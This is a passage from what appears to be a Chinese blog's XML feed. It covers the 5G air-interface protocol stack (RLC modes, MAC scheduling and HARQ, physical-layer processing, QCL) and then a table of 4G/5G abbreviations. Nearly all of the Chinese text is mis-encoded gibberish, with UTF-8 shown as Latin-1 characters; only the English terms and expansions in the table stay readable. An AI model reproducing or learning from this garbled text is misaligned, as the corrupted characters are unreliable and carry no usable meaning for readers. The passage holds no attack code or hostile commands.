·éœ€è¦ç­‰å¾…MACå±‚æŒ‡ç¤º</p><h3 id="ï¼ˆä¸€ï¼‰ã€å®ä½“">ï¼ˆä¸€ï¼‰ã€å®ä½“</h3><ul><li>TMï¼šé€ä¼ ï¼Œä¸åšä»»ä½•å¤„ç†</li><li>AMï¼šç¡®è®¤ï¼Œéœ€è¦ACK/NACK</li><li>UMï¼šéç¡®è®¤ï¼Œæ²¡æœ‰çº é”™æœºåˆ¶ï¼Œæ—¶å»¶ä½ï¼ˆVoIPä¸šåŠ¡ï¼‰</li></ul><h3 id="ï¼ˆäºŒï¼‰ã€åŠŸèƒ½">ï¼ˆäºŒï¼‰ã€åŠŸèƒ½</h3><ul><li>æ£€é”™ã€çº é”™ARQï¼ˆAMï¼‰</li><li>åˆ†æ®µé‡ç»„ï¼ˆUM,AMï¼‰</li><li>é‡åˆ†æ®µï¼ˆAMï¼‰</li><li>é‡å¤åŒ…æ£€æµ‹ï¼ˆAMï¼‰</li><li><em><strong>å–æ¶ˆäº†ä¸²è”åŠŸèƒ½</strong></em></li></ul><p>â— å…­ã€MACå±‚</p><img src="https://i.loli.net/2021/11/14/GsNCRAxEnpvIJlm.jpg" class="lazyload" data-srcset="https://i.loli.net/2021/11/14/GsNCRAxEnpvIJlm.jpg" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt="img" style="zoom:150%;" /><p>MACå±‚ç”¨äºé€»è¾‘ä¿¡é“åˆ°ä¼ è¾“ä¿¡é“çš„æ˜ å°„ UEå’ŒåŸºç«™ä¾§éƒ½æœ‰MACå±‚å®ä½“,ä½†å­˜åœ¨DCï¼ˆåŒè¿æ¥ï¼‰æ—¶ï¼Œç»ˆç«¯åˆ™ä¼šå­˜åœ¨å¤šä¸ªMACå®ä½“</p><p><strong>â— è°ƒåº¦</strong></p><p>å…³é”®åŠŸèƒ½</p><p>â— UEè°ƒåº¦è¯·æ±‚</p><ul><li>PRACHï¼šå½“æ‰‹æœºç©ºå£IDELæ€</li><li>SR-PUCCHï¼šRRCé“¾æ¥è¿˜åœ¨ï¼Œåªæ˜¯æ²¡æœ‰ä¸Šè¡Œèµ„æº</li></ul><p>â— gNBæˆæƒ</p><p>â— UEçŠ¶æ€æŠ¥å‘Š</p><p>â— gNBä¸Šä¸‹è¡Œè°ƒåº¦PDCCH</p><p>â— UEè§£æ—¶é¢‘èµ„æºä½ç½®ï¼Œæ•°æ®ä¼ è¾“ï¼ŒHARQ</p><p><strong>â— é€»è¾‘ä¿¡é“å’Œä¼ è¾“ä¿¡é“ä¹‹é—´çš„æ˜ å°„ï¼ˆä¿¡é“çš„å¤ç”¨å’Œè§£å¤ç”¨ï¼‰</strong></p><p><strong>â— HARQæ§åˆ¶</strong></p><ul><li><strong>åŒæ­¥HARQï¼šä¸€ä¸ªHARQè¿›ç¨‹å‘ç”Ÿåœ¨å›ºå®šçš„æ—¶åˆ»ï¼Œæ¥æ”¶ç«¯é¢„å…ˆçŸ¥é“é‡ä¼ çš„æ—¶åˆ»ã€‚</strong></li><li><strong>å¼‚æ­¥HARQï¼šä¸€ä¸ªHARQè¿›ç¨‹å¯ä»¥å‘ç”Ÿåœ¨ä»»ä½•æ—¶åˆ»ï¼Œæ¥æ”¶ç«¯é¢„å…ˆä¸çŸ¥é“é‡ä¼ çš„æ—¶åˆ»</strong></li><li><strong>æ ¹æ®é‡ä¼ çš„æ•°æ®ç‰¹å¾æ˜¯å¦å‘ç”Ÿå˜åŒ–ï¼ˆé‡ä¼ çš„MCSä¸åˆå§‹çš„ä¸€è‡´ä¸ºéè‡ªé€‚åº”ï¼Œä¸ä¸€æ ·åˆ™ä¸ºè‡ªé€‚åº”ï¼‰ï¼Œå¯ä»¥åˆ†ä¸ºè‡ªé€‚åº”å’Œéè‡ªé€‚åº”ã€‚ç›®å‰NRä¸Šä¸‹è¡Œå…¨éƒ¨é‡‡ç”¨å¼‚æ­¥è‡ªé€‚åº”é‡ä¼ </strong>ã€‚</li><li>ï¼ˆ1ï¼‰ä¸Šè¡Œé‡‡ç”¨å¼‚æ­¥è‡ªé€‚åº”çš„HARQ,åŸºç«™ä¾§ä¸éœ€è¦åé¦ˆACK/NACK,æ‰€ä»¥5Gå–æ¶ˆäº†PHICH,èŠ‚çœäº†ä¿¡é“èµ„æºã€‚åœ¨ä¸‹æ¬¡è°ƒåº¦æ—¶ï¼Œé€šè¿‡NDIï¼ˆæ–°è€æ•°æ®æŒ‡ç¤ºï¼Œ0ä¸ºé‡ä¼ ï¼Œ1ä¸ºåˆä¼ ï¼‰å­—æ®µï¼Œé—´æ¥é€šçŸ¥UEä¸Šè¡Œæ•°æ®è§£è°ƒæ˜¯å¦æˆåŠŸã€‚</li></ul><img src="https://i.loli.net/2021/11/14/2zjOPBxdWRE5hiM.jpg" class="lazyload" data-srcset="https://i.loli.net/2021/11/14/2zjOPBxdWRE5hiM.jpg" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt="img" style="zoom:150%;" /><ul><li>ï¼ˆ2ï¼‰ä¸‹è¡Œé‡‡ç”¨å¼‚æ­¥è‡ªé€‚åº”çš„HARQï¼Œéœ€è¦æŒ‡ç¤ºUEåé¦ˆACK/NACKçš„æ—¶åŸŸä½ç½®</li></ul><img src="https://i.loli.net/2021/11/14/3ctdg8lFuMfseIW.jpg" class="lazyload" data-srcset="https://i.loli.net/2021/11/14/3ctdg8lFuMfseIW.jpg" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt="img" style="zoom:150%;" /><p><strong>â— é€»è¾‘ä¿¡é“ä¼˜å…ˆçº§æ§åˆ¶</strong></p></div><h2 id="ä¸ƒã€PHYå±‚">ä¸ƒã€PHYå±‚</h2><div class="story post-story"><img src="https://i.loli.net/2021/11/14/yIRGK5sL3uHb7f9.jpg" class="lazyload" data-srcset="https://i.loli.net/2021/11/14/yIRGK5sL3uHb7f9.jpg" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt="img" style="zoom:150%;" /><h3 id="ï¼ˆä¸€ï¼‰ã€ç‰©ç†å±‚å¤„ç†æµç¨‹">ï¼ˆä¸€ï¼‰ã€ç‰©ç†å±‚å¤„ç†æµç¨‹</h3><img src="https://i.loli.net/2021/11/14/MhzTUZCAidnpoHx.jpg" class="lazyload" data-srcset="https://i.loli.net/2021/11/14/MhzTUZCAidnpoHx.jpg" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt="img" style="zoom:150%;" /><p>ç‰©ç†å±‚æ˜¯ç©ºå£åè®®æ ˆæœ€å¤æ‚çš„ä¸€å±‚ï¼Œå¦‚å›¾æ‰€ç¤ºçš„æ˜¯ç‰©ç†å±‚çš„å…¸å‹æµç¨‹ï¼Œä½†ä¸åŒä¿¡é“çš„å¤„ç†è¿‡ç¨‹ä¼šæœ‰æ‰€å˜åŒ–ã€‚</p><ul><li>TBï¼ˆTransport Blockï¼Œä¼ è¾“å—ï¼‰ï¼š1ä¸ªTBåŒ…å«1ä¸ªMAC PDUçš„æ•°æ®å—</li><li>CWï¼ˆCode Wordï¼Œç å­—ï¼‰ï¼šé¦–å…ˆå¯¹æ¯ä¸ªTBæ·»åŠ CRCï¼Œç„¶åè¿›è¡Œç å—åˆ†æ®µç”Ÿæˆè‹¥å¹²CBï¼ˆCode Blockï¼Œç å—ï¼‰ï¼Œå¯¹æ¯ä¸ªç å—å¢åŠ CRCã€ä¿¡é“ç¼–ç ã€é€Ÿç‡åŒ¹é…ä¹‹åï¼Œå¾—åˆ°ç å­—</li></ul><img src="https://i.loli.net/2021/11/14/3oXfV2pPgWCELN4.jpg" class="lazyload" data-srcset="https://i.loli.net/2021/11/14/3oXfV2pPgWCELN4.jpg" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt="img" style="zoom:150%;" /><ul><li>å±‚ï¼šä¹Ÿå°±æ˜¯æµï¼Œç å­—é€šè¿‡å±‚æ˜ å°„åˆ°ä¸åŒçš„æµä¸Šï¼Œå®ç°ä¸²è¡Œåˆ°å¹¶è¡Œçš„è½¬æ¢ã€‚æµè¶Šå¤šï¼Œé€Ÿç‡å°±ä¼šè¶Šé«˜ã€‚</li><li>è°ƒåˆ¶ï¼šæ›´é«˜é˜¶çš„è°ƒåˆ¶æ–¹å¼ä½¿æ¯ç¬¦å·æºå¸¦çš„æ¯”ç‰¹æ•°æ›´å¤§ï¼Œä»è€Œå®ç°æ›´é«˜çš„ä¼ è¾“é€Ÿç‡ã€‚</li></ul><img src="https://i.loli.net/2021/11/14/zeJYxn3RQNsiZKl.jpg" class="lazyload" data-srcset="https://i.loli.net/2021/11/14/zeJYxn3RQNsiZKl.jpg" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt="img" style="zoom:150%;" /><ul><li>å¤©çº¿ç«¯å£ï¼šå¤©çº¿çš„é€»è¾‘ç«¯å£ï¼Œæ¯ä¸ªç«¯å£å·ä¸Šæœ‰è‡ªå·±ç‹¬ç«‹çš„DMRSä¿¡å·ã€‚å–ä»£äº†LTEä¸­CRSå‚è€ƒä¿¡å·ï¼ŒèŠ‚çœäº†åŠŸç‡çš„å¼€é”€ï¼Œç¼“è§£äº†MOD 3å¹²æ‰°ã€‚</li><li>ç¼–ç ï¼šeMBBåœºæ™¯ï¼Œæ§åˆ¶ä¿¡é“ä½¿ç”¨Polarç ç¼–ç ï¼Œä¸šåŠ¡ä¿¡é“ä½¿ç”¨LDPCç ç¼–ç </li><li>å±‚æ˜ å°„ï¼šæŠŠç å­—æ˜ å°„åˆ°å¤šä¸ªå±‚å¹¶è¡Œå‘é€çš„è¿‡ç¨‹</li><li>é¢„ç¼–ç ï¼šç»è¿‡åŠ æƒï¼Œä½¿æ•°æ®æµæ˜ å°„åˆ°å¤©çº¿ç«¯å£</li><li>æ³¢æŸï¼šå„å±‚æ•°æ®é€šè¿‡èµ‹å‹åŠ æƒåæ˜ å°„åˆ°å¤©çº¿ä¸Šå‘é€ï¼Œåœ¨æƒå€¼çš„ä½œç”¨ä¸‹ï¼Œæ³¢æŸæŒ‡å‘UEã€‚æ³¢æŸçš„ä¸ªæ•°ä¸æµçš„ä¸ªæ•°ç›¸åŒã€‚</li></ul><img src="https://i.loli.net/2021/11/14/tkjDaxmXg3bS4qO.jpg" class="lazyload" data-srcset="https://i.loli.net/2021/11/14/tkjDaxmXg3bS4qO.jpg" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt="img" style="zoom:150%;" /><h3 id="ï¼ˆäºŒï¼‰ã€å‡†å…±å€ï¼ˆQCL-Quasi-Co-Location">ï¼ˆäºŒï¼‰ã€å‡†å…±å€ï¼ˆQCL,Quasi Co-Location)</h3><img src="https://i.loli.net/2021/11/14/uTzefyZnlvFrKRD.jpg" class="lazyload" data-srcset="https://i.loli.net/2021/11/14/uTzefyZnlvFrKRD.jpg" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt="img" style="zoom:150%;" /><p>â— åŠŸèƒ½ï¼š5Gæ•°æ®é€šè¿‡æ³¢æŸçš„æ–¹å¼å‘é€ï¼Œæ¯ä¸ªä¿¡é“åœ¨ç©ºå£çš„æ³¢æŸä¸Šå¦‚ä½•å‘é€å†™ä¸€ç§æ²¡æœ‰å®šä¹‰ï¼Œç»ˆç«¯é€šè¿‡ä¸¤ä¸ªä¿¡å·çš„QCLå…³ç³»å¯ä»¥ä»æŸå·²çŸ¥ä¿¡å·çš„ä¼ æ’­ç‰¹å¾ä¸­æ¨å¯¼å‡ºæœªçŸ¥ä¿¡å·çš„ä¼ æ’­ç‰¹å¾ï¼Œè¿›è€Œæé«˜ç»ˆç«¯å¯¹æœªçŸ¥ä¿¡é“çš„è§£è°ƒèƒ½åŠ›ã€‚</p><p>â— QCLç±»å‹ï¼šç”±äºä¸åŒä¿¡å·çš„æ³¢æŸå‘é€æ–¹å¼ä¸åŒï¼Œç‰¹æ€§å¯èƒ½å­˜åœ¨å·®å¼‚ï¼Œæ‰€ä»¥æœ‰QCLç±»å‹ä¹‹åˆ†ã€‚</p><img src="https://i.loli.net/2021/11/14/oLsb3UVPWwaKcz7.jpg" class="lazyload" data-srcset="https://i.loli.net/2021/11/14/oLsb3UVPWwaKcz7.jpg" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt="img" style="zoom:150%;" /><p><img src="C:/siz_bak/siz_Master/Dropbox/Master/%E8%AE%BA%E6%96%87&amp;%20%E9%A1%B9%E7%9B%AE%20md/LTE%204G&amp;5G/5G%20Basic%20Knowledge/img_article/5G%20%E7%A9%BA%E5%8F%A3%E5%8D%8F%E8%AE%AE%E6%A0%88/kjy8loegrMiBwZP.jpg" class="lazyload" data-srcset="C:/siz_bak/siz_Master/Dropbox/Master/%E8%AE%BA%E6%96%87&amp;%20%E9%A1%B9%E7%9B%AE%20md/LTE%204G&amp;5G/5G%20Basic%20Knowledge/img_article/5G%20%E7%A9%BA%E5%8F%A3%E5%8D%8F%E8%AE%AE%E6%A0%88/kjy8loegrMiBwZP.jpg" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt="5Gç©ºå£åè®®æ ˆæ€ç»´å¯¼å›¾"></p></div>]]></content>
      
      
      <categories>
          
          <category> æŠ€æœ¯å‘ </category>
          
          <category> LTE </category>
          
      </categories>
      
      
        <tags>
            
            <tag> LTE </tag>
            
            <tag> 5G </tag>
            
            <tag> [object Object] </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>4G&amp;5Gç¼©å†™è¯å®šä¹‰</title>
      <link href="/posts/cdc9cc72/"/>
      <url>/posts/cdc9cc72/</url>
      
        <content type="html"><![CDATA[<table><thead><tr><th>ç¼©å†™</th><th>å…¨ç§°</th><th>è§£é‡Š</th></tr></thead><tbody><tr><td>4G-GUTI</td><td>4G-Globally Unique Temporary  Identifier</td><td>4G-å…¨çƒå”¯ä¸€ä¸´æ—¶æ ‡è¯†ç¬¦</td></tr><tr><td>5GCN</td><td>5G Core Network</td><td>5Gæ ¸å¿ƒç½‘ç»œ</td></tr><tr><td>5G-GUTI</td><td>5G-Globally Unique Temporary Identifier</td><td>5G-å…¨çƒå”¯ä¸€ä¸´æ—¶æ ‡è¯†ç¬¦</td></tr><tr><td>5GMM</td><td>5GS Mobility Management</td><td>5GSç§»åŠ¨ç®¡ç†</td></tr><tr><td>5G-RG</td><td>5G Residential Gateway</td><td>5Gä½å®…ç½‘å…³</td></tr><tr><td>5G-BRG</td><td>5G Broadband Residential Gateway</td><td>5Gå®½å¸¦ä½å®…ç½‘å…³</td></tr><tr><td>5G-CRG</td><td>5G Cable Residential Gateway</td><td>5Gæœ‰çº¿ä½å®…ç½‘å…³</td></tr><tr><td>5GS</td><td>5G System</td><td>5Gç³»ç»Ÿ</td></tr><tr><td>5GSM</td><td>5GS Session Management</td><td>5Gä¼šè¯ç®¡ç†</td></tr><tr><td>5G-S-TMSI</td><td>5G S-Temporary Mobile Subscription Identifier</td><td>5G S-ä¸´æ—¶ç§»åŠ¨è®¢é˜…æ ‡è¯†ç¬¦</td></tr><tr><td>5G-TMSI</td><td>5G Temporary Mobile Subscription Identifier</td><td>5G ä¸´æ—¶ç§»åŠ¨è®¢é˜…æ ‡è¯†ç¬¦</td></tr><tr><td>5QI</td><td>5G QoS Identifier</td><td>5G QoS æ ‡è¯†ç¬¦</td></tr><tr><td>ACS</td><td>Auto-Configuration Server</td><td>è‡ªåŠ¨é…ç½®æœåŠ¡å™¨</td></tr><tr><td>AKA</td><td>Authentication and Key Agreement</td><td>èº«ä»½éªŒè¯å’Œå¯†é’¥åè®®</td></tr><tr><td>AKMA</td><td>Authentication and Key Management for Applications</td><td>åº”ç”¨ç¨‹åºçš„ AKMA èº«ä»½éªŒè¯å’Œå¯†é’¥ç®¡ç†</td></tr><tr><td>A-KID</td><td>AKMA Key Identifier</td><td>AKMA å¯†é’¥æ ‡è¯†ç¬¦</td></tr><tr><td>A-TID</td><td>AKMA Temporary Identifier</td><td>AKMA ä¸´æ—¶æ ‡è¯†ç¬¦</td></tr><tr><td>AMBR</td><td>Aggregate Maximum Bit Rate</td><td>èšåˆæœ€å¤§æ¯”ç‰¹ç‡</td></tr><tr><td>AMF</td><td>Access and Mobility Management Function</td><td>è®¿é—®å’Œç§»åŠ¨ç®¡ç†åŠŸèƒ½</td></tr><tr><td>APN</td><td>Access Point Name</td><td>æ¥å…¥ç‚¹åç§°</td></tr><tr><td>ATSSS</td><td>Access Traffic Steering, Switching and Splitting</td><td>æ¥å…¥æµé‡è½¬å‘ã€åˆ‡æ¢å’Œåˆ†æµ</td></tr><tr><td>AUSF</td><td>Authentication Server Function</td><td>è®¤è¯æœåŠ¡å™¨åŠŸèƒ½</td></tr><tr><td>CAG</td><td>Closed access group</td><td>å°é—­è®¿é—®ç»„</td></tr><tr><td>CHAP</td><td>Challenge Handshake Authentication Protocol</td><td>è´¨è¯¢æ¡æ‰‹è®¤è¯åè®®</td></tr><tr><td>DDX</td><td>Downlink Data Expected</td><td>é¢„æœŸ DDX ä¸‹è¡Œæ•°æ®</td></tr><tr><td>DL</td><td>Downlink</td><td>ä¸‹è¡Œé“¾è·¯</td></tr><tr><td>DN</td><td>Data Network</td><td>æ•°æ®ç½‘ç»œ</td></tr><tr><td>DNN</td><td>Data Network Name</td><td>æ•°æ®ç½‘ç»œåç§°</td></tr><tr><td>DNS</td><td>Domain Name System</td><td>åŸŸåç³»ç»Ÿ</td></tr><tr><td>eDRX</td><td>Extended DRX cycle</td><td>æ‰©å±• DRX å‘¨æœŸ</td></tr><tr><td>DS-TT</td><td>Device-Side TSN Translator</td><td>è®¾å¤‡ç«¯ TSN è½¬æ¢å™¨</td></tr><tr><td>EUI</td><td>Extended Unique Identifier</td><td>æ‰©å±•å”¯ä¸€æ ‡è¯†ç¬¦</td></tr><tr><td>E-UTRAN</td><td>Evolved Universal Terrestrial Radio Access Network</td><td>æ¼”è¿›çš„é€šç”¨é™†åœ°æ— çº¿æ¥å…¥ç½‘ç»œ</td></tr><tr><td>EAC</td><td>Early Admission Control</td><td>æ—©æœŸè¿›å…¥æ§åˆ¶</td></tr><tr><td>EAP-AKAâ€™</td><td>Improved Extensible Authentication Protocol method for 3rd  generation Authentication and Key Agreement</td><td>ç”¨äºç¬¬ä¸‰ä»£èº«ä»½éªŒè¯å’Œå¯†é’¥åè®®çš„æ”¹è¿›çš„å¯æ‰©å±•èº«ä»½éªŒè¯åè®®æ–¹æ³•</td></tr><tr><td>EAS</td><td>Edge Application Server</td><td>è¾¹ç¼˜åº”ç”¨æœåŠ¡å™¨</td></tr><tr><td>EASDF</td><td>Edge Application Server Discovery Function</td><td>è¾¹ç¼˜åº”ç”¨æœåŠ¡å™¨å‘ç°åŠŸèƒ½</td></tr><tr><td>ECIES</td><td>Elliptic Curve Integrated Encryption Scheme</td><td>æ¤­åœ†æ›²çº¿é›†æˆåŠ å¯†æ–¹æ¡ˆ</td></tr><tr><td>ECS</td><td>Edge Configuration Server</td><td>è¾¹ç¼˜é…ç½®æœåŠ¡å™¨</td></tr><tr><td>EEC</td><td>Edge Enabler Client</td><td>Edge Enabler å®¢æˆ·ç«¯</td></tr><tr><td>EPD</td><td>Extended Protocol Discriminator</td><td>EPD æ‰©å±•åè®®é‰´åˆ«å™¨</td></tr><tr><td>EMM</td><td>EPS Mobility Management</td><td>EPS ç§»åŠ¨æ€§ç®¡ç†</td></tr><tr><td>EPC</td><td>Evolved Packet Core Network</td><td>æ¼”è¿›åˆ†ç»„æ ¸å¿ƒç½‘</td></tr><tr><td>EPS</td><td>Evolved Packet System</td><td>æ¼”è¿›åˆ†ç»„ç³»ç»Ÿ</td></tr><tr><td>ESM</td><td>EPS Session Management</td><td>EPS ä¼šè¯ç®¡ç†</td></tr><tr><td>FN-RG</td><td>Fixed Network RG</td><td>å›ºç½‘RG</td></tr><tr><td>FN-BRG</td><td>Fixed Network Broadband RG</td><td>å›ºç½‘å®½å¸¦RG</td></tr><tr><td>FN-CRG</td><td>Fixed Network Cable RG</td><td>å›ºç½‘ç”µç¼† RG</td></tr><tr><td>Gbps</td><td>Gigabits per second</td><td>åƒå…†ä½æ¯ç§’</td></tr><tr><td>GFBR</td><td>Guaranteed Flow Bit Rate</td><td>ä¿è¯æµè§ˆæ¯”ç‰¹ç‡</td></tr><tr><td>GUAMI</td><td>Globally Unique AMF Identifier</td><td>å…¨çƒå”¯ä¸€ AMF æ ‡è¯†ç¬¦</td></tr><tr><td>IAB</td><td>Integrated access and backhaul</td><td>é›†æˆæ¥å…¥å’Œå›ä¼ </td></tr><tr><td>IMEI</td><td>International Mobile station Equipment Identity</td><td>å›½é™…ç§»åŠ¨å°è®¾å¤‡æ ‡è¯†</td></tr><tr><td>IMEISV</td><td>International Mobile station Equipment Identity and Software  Version number</td><td>IMEISV å›½é™…ç§»åŠ¨å°è®¾å¤‡æ ‡è¯†å’Œè½¯ä»¶ç‰ˆæœ¬å·</td></tr><tr><td>IMSI</td><td>International Mobile Subscriber Identity</td><td>å›½é™…ç§»åŠ¨ç”¨æˆ·èº«ä»½</td></tr><tr><td>IP-CAN</td><td>IP-Connectivity Access Network</td><td>IP-è¿é€šæ€§æ¥å…¥ç½‘ç»œ</td></tr><tr><td>KSI</td><td>Key Set Identifier</td><td>å¯†é’¥é›†æ ‡è¯†ç¬¦</td></tr><tr><td>LADN</td><td>Local Area Data Network</td><td>å±€åŸŸç½‘æ•°æ®ç½‘ç»œ</td></tr><tr><td>LCS</td><td>LoCation Services</td><td>ä½ç½®æœåŠ¡</td></tr><tr><td>LMF</td><td>Location Management Function</td><td>ä½ç½®ç®¡ç†åŠŸèƒ½</td></tr><tr><td>LPP</td><td>LTE Positioning Protocol</td><td>LTE å®šä½åè®®</td></tr><tr><td>MAC</td><td>Message Authentication Code</td><td>æ¶ˆæ¯è®¤è¯ç </td></tr><tr><td>MA PDU</td><td>Multi-Access PDU</td><td>å¤šè·¯è®¿é—® PDU</td></tr><tr><td>Mbps</td><td>Megabits per second</td><td>å…†æ¯”ç‰¹æ¯ç§’</td></tr><tr><td>MFBR</td><td>Maximum Flow Bit Rate</td><td>æœ€å¤§æµæ¯”ç‰¹ç‡</td></tr><tr><td>MICO</td><td>Mobile Initiated Connection Only</td><td>ä»…é™ MICO Mobile å‘èµ·çš„è¿æ¥</td></tr><tr><td>MUSIM</td><td>Multi-USIM</td><td>å¤šUSIM</td></tr><tr><td>N3IWF</td><td>Non-3GPP Inter-Working Function</td><td>é 3GPP äº’é€šåŠŸèƒ½</td></tr><tr><td>N5CW</td><td>Non-5G-Capable over WLAN</td><td>ä¸æ”¯æŒ 5G çš„ WLAN</td></tr><tr><td>N5GC</td><td>Non-5G Capable</td><td>é 5G èƒ½åŠ›</td></tr><tr><td>NAI</td><td>Network Access Identifier</td><td>ç½‘ç»œè®¿é—®æ ‡è¯†ç¬¦</td></tr><tr><td>NITZ</td><td>Network Identity and Time Zone</td><td>ç½‘ç»œèº«ä»½å’Œæ—¶åŒº</td></tr><tr><td>NR</td><td>New Radio</td><td>æ–°æ— çº¿ç”µ</td></tr><tr><td>ngKSI</td><td>Key Set Identifier for Next Generation Radio Access Network</td><td>ä¸‹ä¸€ä»£æ— çº¿æ¥å…¥ç½‘ç»œçš„ ngKSI å¯†é’¥é›†æ ‡è¯†ç¬¦</td></tr><tr><td>NPN</td><td>Non-public network</td><td>éå…¬ç½‘</td></tr><tr><td>NSAC</td><td>Network Slice Admission Control</td><td>ç½‘ç»œåˆ‡ç‰‡å‡†å…¥æ§åˆ¶</td></tr><tr><td>NSACF</td><td>Network Slice Admission Control FunctionNSSAA Network  slice-specific authentication and authorization</td><td>ç½‘ç»œåˆ‡ç‰‡å‡†å…¥æ§åˆ¶åŠŸèƒ½NSSAA ç½‘ç»œåˆ‡ç‰‡ä¸“ç”¨è®¤è¯æˆæƒ</td></tr><tr><td>NSSAAF</td><td>NSSAA Function</td><td>NSSAA åŠŸèƒ½</td></tr><tr><td>NSSAI</td><td>Network Slice Selection Assistance Information</td><td>ç½‘ç»œåˆ‡ç‰‡é€‰æ‹©è¾…åŠ©ä¿¡æ¯</td></tr><tr><td>OS</td><td>Operating System</td><td>æ“ä½œç³»ç»Ÿ</td></tr><tr><td>OS Id</td><td>OS Identity</td><td>æ“ä½œç³»ç»Ÿ ID æ“ä½œç³»ç»Ÿèº«ä»½</td></tr><tr><td>PAP</td><td>Password Authentication Protocol</td><td>å¯†ç è®¤è¯åè®®</td></tr><tr><td>PCO</td><td>Protocol Configuration Option</td><td>åè®®é…ç½®é€‰é¡¹</td></tr><tr><td>PEI</td><td>Permanent Equipment Identifier</td><td>æ°¸ä¹…è®¾å¤‡æ ‡è¯†ç¬¦</td></tr><tr><td>PNI-NPN</td><td>Public Network Integrated Non-Public Network</td><td>å…¬ç½‘ç»¼åˆéå…¬ç½‘</td></tr><tr><td>ProSe</td><td>Proximity based Services</td><td>å°±è¿‘æœåŠ¡</td></tr><tr><td>ProSeP</td><td>5G ProSe policy</td><td>5G ProSe æ”¿ç­–</td></tr><tr><td>PTI</td><td>Procedure Transaction Identity</td><td>ç¨‹åºäº‹åŠ¡æ ‡è¯†</td></tr><tr><td>PVS</td><td>Provisioning Server</td><td>ä¾›åº”æœåŠ¡å™¨</td></tr><tr><td>QFI</td><td>QoS Flow Identifier</td><td>QoS æµæ ‡è¯†ç¬¦</td></tr><tr><td>QoS</td><td>Quality of Service</td><td>QoS æœåŠ¡è´¨é‡</td></tr><tr><td>QRI</td><td>QoS Rule Identifier</td><td>QoS è§„åˆ™æ ‡è¯†ç¬¦</td></tr><tr><td>RACS</td><td>Radio Capability Signalling Optimisation</td><td>æ— çº¿ç”µèƒ½åŠ›ä¿¡ä»¤ä¼˜åŒ–</td></tr><tr><td>Â®AN</td><td>(Radio) Access Network</td><td>æ— çº¿ç”µæ¥å…¥ç½‘ç»œ</td></tr><tr><td>RFSP</td><td>RAT Frequency Selection Priority</td><td>RAT é¢‘ç‡é€‰æ‹©ä¼˜å…ˆçº§</td></tr><tr><td>RG</td><td>Residential Gateway</td><td>ä½å®…ç½‘å…³</td></tr><tr><td>RPLMN</td><td>Registered PLMN</td><td>æ³¨å†Œ PLMN</td></tr><tr><td>RQA</td><td>Reflective QoS Attribute</td><td>åå°„ QoS å±æ€§</td></tr><tr><td>RQI</td><td>Reflective QoS Indication</td><td>åå°„å¼ QoS æŒ‡ç¤º</td></tr><tr><td>RSNPN</td><td>Registered SNPN</td><td>æ³¨å†Œ SNPN</td></tr><tr><td>S-NSSAI</td><td>Single NSSAI</td><td>å• NSSAI</td></tr><tr><td>SA</td><td>Security Association</td><td>SAå®‰å…¨åä¼š</td></tr><tr><td>SDF</td><td>Service Data Flow</td><td>æœåŠ¡æ•°æ®æµ</td></tr><tr><td>SMF</td><td>Session Management Function</td><td>ä¼šè¯ç®¡ç†åŠŸèƒ½</td></tr><tr><td>SGC</td><td>Service Gap Control</td><td>æœåŠ¡å·®è·æ§åˆ¶</td></tr><tr><td>SNN</td><td>Serving Network Name</td><td>æœåŠ¡ç½‘ç»œåç§°</td></tr><tr><td>SNPN</td><td>Stand-alone Non-Public Network</td><td>ç‹¬ç«‹éå…¬ç½‘</td></tr><tr><td>SOR</td><td>Steering of Roaming</td><td>æ¼«æ¸¸è½¬å‘</td></tr><tr><td>SOR-CMCI</td><td>Steering of Roaming Connected Mode Control Information</td><td>æ¼«æ¸¸è¿æ¥æ¨¡å¼æ§åˆ¶ä¿¡æ¯çš„ SOR-CMCI è½¬å‘</td></tr><tr><td>SUCI</td><td>Subscription Concealed Identifier</td><td>è®¢é˜…éšè—æ ‡è¯†ç¬¦</td></tr><tr><td>SUPI</td><td>Subscription Permanent Identifier</td><td>è®¢é˜…æ°¸ä¹…æ ‡è¯†ç¬¦</td></tr><tr><td>TA</td><td>Tracking Area</td><td>è¿½è¸ªåŒº</td></tr><tr><td>TAC</td><td>Tracking Area Code</td><td>è¿½è¸ªåŒºå·</td></tr><tr><td>TAI</td><td>Tracking Area Identity</td><td>è·Ÿè¸ªåŒºåŸŸæ ‡è¯†</td></tr><tr><td>Tbps</td><td>Terabits per second</td><td>æ¯ç§’ Tbps å¤ªæ¯”ç‰¹</td></tr><tr><td>TNGF</td><td>Trusted Non-3GPP Gateway Function</td><td>å¯ä¿¡é 3GPP ç½‘å…³åŠŸèƒ½</td></tr><tr><td>TSC</td><td>Time Sensitive Communication</td><td>æ—¶é—´æ•æ„Ÿé€šä¿¡</td></tr><tr><td>TWIF</td><td>Trusted WLAN Interworking Function</td><td>å¯ä¿¡ WLAN äº’é€šåŠŸèƒ½</td></tr><tr><td>TSN</td><td>Time-Sensitive Networking</td><td>æ—¶é—´æ•æ„Ÿç½‘ç»œ</td></tr><tr><td>UAS</td><td>Uncrewed Aerial System</td><td>æ— äººç©ºä¸­ç³»ç»Ÿ</td></tr><tr><td>UAV</td><td>Uncrewed Aerial Vehicle</td><td>æ— äººé©¾é©¶é£è¡Œå™¨</td></tr><tr><td>UDM</td><td>Unified Data 